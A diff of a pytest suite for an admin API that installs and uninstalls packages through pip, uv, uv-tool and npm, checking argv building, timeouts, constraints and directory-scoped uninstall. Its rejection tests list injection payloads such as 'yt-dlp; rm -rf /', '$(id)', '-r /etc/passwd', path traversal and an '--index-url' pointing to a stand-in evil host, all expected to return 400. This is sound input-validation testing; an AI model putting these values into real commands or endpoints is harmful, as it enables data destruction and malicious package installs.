@@ -216,20 +216,6 @@ class TestPatchRename:
         assert body["config"]["tags"] == ["web"]
         assert "name" not in body["config"]
 
-class TestCatalog:
-    """GET /admin/static/catalog.json — カタログ配信の契約。"""
-
-    def test_catalog_served_with_required_keys(self, client):
-        r = client.get("/admin/static/catalog.json")
-        assert r.status_code == 200
-        servers = r.json()["servers"]
-        assert isinstance(servers, list)
-        assert servers  # カタログは空でない
-        for entry in servers:
-            for key in ("name", "command", "args", "tags", "docs_url"):
-                assert key in entry, f"{entry.get('name')}: missing {key}"
-
-
 class TestMetrics:
     def test_returns_metrics(self, client):
         r = client.get("/admin/api/metrics")
@@ -613,3 +599,391 @@ class TestInstall:
         assert "yt-dlp" in calls["argv"]
         assert "command" not in str(calls.get("kwargs", {}))
         assert str(tmp_path / "pip-extras") in calls["argv"]
+
+    def test_url_and_range_specs_allowed(self, client, monkeypatch, tmp_path):
+        """pip accepts git+https:// / https:// URL specs and PEP 508 ranges."""
+        import asyncio as _asyncio
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                return (b"out", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            calls["argv"] = list(argv)
+            calls["kwargs"] = kwargs
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        specs = (
+            "git+https://github.com/user/repo.git",
+            "git+https://github.com/user/repo.git@v1.0#egg=my-pkg",
+            "https://example.com/pkg-1.0.tar.gz",
+            "https://example.com/pkg-1.0-py3-none-any.whl",
+            "yt-dlp>=2024.1,<2025",
+            "requests[security]==2.31.0",
+        )
+        for spec in specs:
+            r = client.post(
+                "/admin/api/tools/install",
+                json={"manager": "pip", "packages": [spec]},
+            )
+            assert r.status_code == 200, spec
+            assert spec in calls["argv"], spec
+            assert calls["argv"][:3] == ["pip", "install", "--target"]
+            assert "command" not in str(calls.get("kwargs", {}))
+
+    def test_uv_tool_install_argv(self, client, monkeypatch, tmp_path):
+        """manager 'uv-tool' → fixed argv ['uv', 'tool', 'install', ...]."""
+        import asyncio as _asyncio
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                return (b"out", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            calls["argv"] = list(argv)
+            calls["kwargs"] = kwargs
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        r = client.post(
+            "/admin/api/tools/install",
+            json={"manager": "uv-tool", "packages": ["some-mcp-server"]},
+        )
+        assert r.status_code == 200
+        assert r.json()["success"] is True
+        assert calls["argv"] == ["uv", "tool", "install", "some-mcp-server"]
+        assert "command" not in str(calls.get("kwargs", {}))
+
+    def test_malicious_specs_rejected_400(self, client):
+        """Flags, shell metas, control chars, traversal — 400 for every
+        manager, including the relaxed URL/range spec paths."""
+        bad_specs = (
+            "-r /etc/passwd",
+            "--index-url https://evil.example/simple",
+            "-e .",
+            "yt\ndlp",
+            "yt-dlp\x00",
+            "yt-dlp; rm -rf /",
+            "foo && id",
+            "$(id)",
+            "https://evil.example/$(id)",
+            "foo`id`",
+            "..",
+            "a/b",
+            "a b",
+        )
+        for manager in ("pip", "uv", "uv-tool", "npm"):
+            for bad in bad_specs:
+                r = client.post(
+                    "/admin/api/tools/install",
+                    json={"manager": manager, "packages": [bad]},
+                )
+                assert r.status_code == 400, (manager, bad)
+
+    def test_install_timeout_is_300s(self, client, monkeypatch, tmp_path):
+        import asyncio as _asyncio
+
+        assert admin_router._INSTALL_TIMEOUT == 300.0
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = -9
+
+            def kill(self):
+                calls["killed"] = True
+
+            async def wait(self):
+                return 0
+
+            async def communicate(self):
+                raise _asyncio.TimeoutError()
+
+        async def fake_exec(*argv, **kwargs):
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        r = client.post(
+            "/admin/api/tools/install",
+            json={"manager": "pip", "packages": ["slowpkg"]},
+        )
+        assert r.status_code == 504
+        assert "300s" in r.json()["detail"]
+        assert calls.get("killed") is True
+
+    def test_uv_tool_constraints_argv(self, client, monkeypatch, tmp_path):
+        """uv-tool + constraints → ['--with', spec] pairs before packages."""
+        import asyncio as _asyncio
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                return (b"out", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            calls["argv"] = list(argv)
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        r = client.post(
+            "/admin/api/tools/install",
+            json={
+                "manager": "uv-tool",
+                "packages": ["git+https://github.com/J-Quants/j-quants-doc-mcp.git"],
+                "constraints": ["mcp<2"],
+            },
+        )
+        assert r.status_code == 200
+        assert calls["argv"] == [
+            "uv", "tool", "install",
+            "--with", "mcp<2",
+            "git+https://github.com/J-Quants/j-quants-doc-mcp.git",
+        ]
+
+    def test_pip_uv_constraints_appended_at_end(self, client, monkeypatch, tmp_path):
+        """pip/uv: constraints concatenate at argv end (no --with)."""
+        import asyncio as _asyncio
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                return (b"out", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            calls["argv"] = list(argv)
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        heads = (
+            ("pip", ["pip", "install", "--target"]),
+            ("uv", ["uv", "pip", "install", "--target"]),
+        )
+        for manager, head in heads:
+            r = client.post(
+                "/admin/api/tools/install",
+                json={
+                    "manager": manager,
+                    "packages": ["yt-dlp"],
+                    "constraints": ["mcp<2"],
+                },
+            )
+            assert r.status_code == 200, manager
+            assert calls["argv"] == [
+                *head, str(tmp_path / "pip-extras"), "yt-dlp", "mcp<2",
+            ], manager
+            assert "--with" not in calls["argv"]
+
+    def test_npm_constraints_rejected_400(self, client, monkeypatch, tmp_path):
+        r = client.post(
+            "/admin/api/tools/install",
+            json={"manager": "npm", "packages": ["pkg"], "constraints": ["mcp<2"]},
+        )
+        assert r.status_code == 400
+
+    def test_uninstall_constraints_rejected_400(self, client):
+        r = client.post(
+            "/admin/api/tools/uninstall",
+            json={"manager": "uv-tool", "packages": ["pkg"], "constraints": ["mcp<2"]},
+        )
+        assert r.status_code == 400
+
+    def test_constraint_injection_rejected_400(self, client):
+        """Flag/shell/control/whitespace injection disguised as a constraint."""
+        bad_constraints = (
+            "--foo",
+            "-r file",
+            "--index-url https://evil.example/simple",
+            "mcp<2 ok",
+            "mcp\n<2",
+            "mcp<2\x00",
+            "mcp; id",
+            "$(id)",
+            "mcp`id`",
+            ".mcp",
+        )
+        for bad in bad_constraints:
+            r = client.post(
+                "/admin/api/tools/install",
+                json={
+                    "manager": "uv-tool",
+                    "packages": ["pkg"],
+                    "constraints": [bad],
+                },
+            )
+            assert r.status_code == 400, bad
+
+    def test_constraint_range_specifiers_allowed(self, client, monkeypatch, tmp_path):
+        """PEP 440/508 specifiers < > ! = ~ , ( ) are valid in constraints."""
+        import asyncio as _asyncio
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                return (b"out", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            calls["argv"] = list(argv)
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        specifiers = (
+            "mcp<2",
+            "mcp>=1.0,<2",
+            "mcp!=1.2.3",
+            "mcp~=1.0",
+            "foo(==1.0)",
+            "mcp[server]<2",
+        )
+        for spec in specifiers:
+            r = client.post(
+                "/admin/api/tools/install",
+                json={"manager": "uv-tool", "packages": ["pkg"], "constraints": [spec]},
+            )
+            assert r.status_code == 200, spec
+            assert spec in calls["argv"], spec
+
+
+class TestUninstall:
+    """POST /admin/api/tools/uninstall — fixed argv for npm/uv-tool,
+    EXTRAS_DIR directory removal for pip/uv (no --target support)."""
+
+    def test_legacy_command_rejected_400(self, client):
+        r = client.post(
+            "/admin/api/tools/uninstall", json={"command": "pip uninstall foo"}
+        )
+        assert r.status_code == 400
+        assert "manager" in r.json()["detail"] or "packages" in r.json()["detail"]
+
+    def test_npm_uninstall_calls_exec_without_shell(self, client, monkeypatch, tmp_path):
+        import asyncio as _asyncio
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                return (b"removed 1 package", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            calls["argv"] = list(argv)
+            calls["kwargs"] = kwargs
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        r = client.post(
+            "/admin/api/tools/uninstall",
+            json={"manager": "npm", "packages": ["some-mcp-server"]},
+        )
+        assert r.status_code == 200
+        assert r.json()["success"] is True
+        assert calls["argv"] == ["npm", "uninstall", "some-mcp-server"]
+        assert "command" not in str(calls.get("kwargs", {}))
+
+    def test_uv_tool_uninstall_argv(self, client, monkeypatch, tmp_path):
+        import asyncio as _asyncio
+
+        calls: dict = {}
+
+        class FakeProc:
+            returncode = 0
+
+            async def communicate(self):
+                return (b"some-mcp-server uninstalled", b"")
+
+        async def fake_exec(*argv, **kwargs):
+            calls["argv"] = list(argv)
+            calls["kwargs"] = kwargs
+            return FakeProc()
+
+        monkeypatch.setattr(_asyncio, "create_subprocess_exec", fake_exec)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(tmp_path / "pip-extras"))
+
+        r = client.post(
+            "/admin/api/tools/uninstall",
+            json={"manager": "uv-tool", "packages": ["some-mcp-server"]},
+        )
+        assert r.status_code == 200
+        assert r.json()["success"] is True
+        assert calls["argv"] == ["uv", "tool", "uninstall", "some-mcp-server"]
+        assert "command" not in str(calls.get("kwargs", {}))
+
+    def test_pip_uninstall_removes_only_extras_dirs(self, client, monkeypatch, tmp_path):
+        extras = tmp_path / "pip-extras"
+        (extras / "yt_dlp").mkdir(parents=True)
+        (extras / "yt_dlp-2025.1.1.dist-info").mkdir()
+        (extras / "requests").mkdir()
+        (extras / "requests-2.31.0.dist-info").mkdir()
+        sentinel = tmp_path / "outside.txt"
+        sentinel.write_text("keep")
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(extras))
+
+        r = client.post(
+            "/admin/api/tools/uninstall",
+            json={"manager": "pip", "packages": ["yt-dlp"]},
+        )
+        assert r.status_code == 200
+        data = r.json()
+        assert data["success"] is True
+        assert sorted(data["removed"]) == ["yt_dlp", "yt_dlp-2025.1.1.dist-info"]
+        assert not (extras / "yt_dlp").exists()
+        assert not (extras / "yt_dlp-2025.1.1.dist-info").exists()
+        # 未指定のパッケージと EXTRAS_DIR 外 (sentinel) は触らない
+        assert (extras / "requests").exists()
+        assert (extras / "requests-2.31.0.dist-info").exists()
+        assert sentinel.exists()
+
+    def test_pip_uninstall_zero_hits_reports_failure(self, client, monkeypatch, tmp_path):
+        extras = tmp_path / "pip-extras"
+        (extras / "requests").mkdir(parents=True)
+        monkeypatch.setattr(admin_router, "_EXTRAS_DIR", str(extras))
+
+        r = client.post(
+            "/admin/api/tools/uninstall",
+            json={"manager": "uv", "packages": ["not-installed-pkg"]},
+        )
+        assert r.status_code == 200
+        data = r.json()
+        assert data["success"] is False
+        assert data["removed"] == []
+        assert (extras / "requests").exists()
+
+    def test_traversal_and_flag_input_rejected_400(self, client):
+        for bad in ("..", "../../etc", "/etc/passwd", "a/b", "-r foo"):
+            r = client.post(
+                "/admin/api/tools/uninstall",
+                json={"manager": "pip", "packages": [bad]},
+            )
+            assert r.status_code == 400, bad
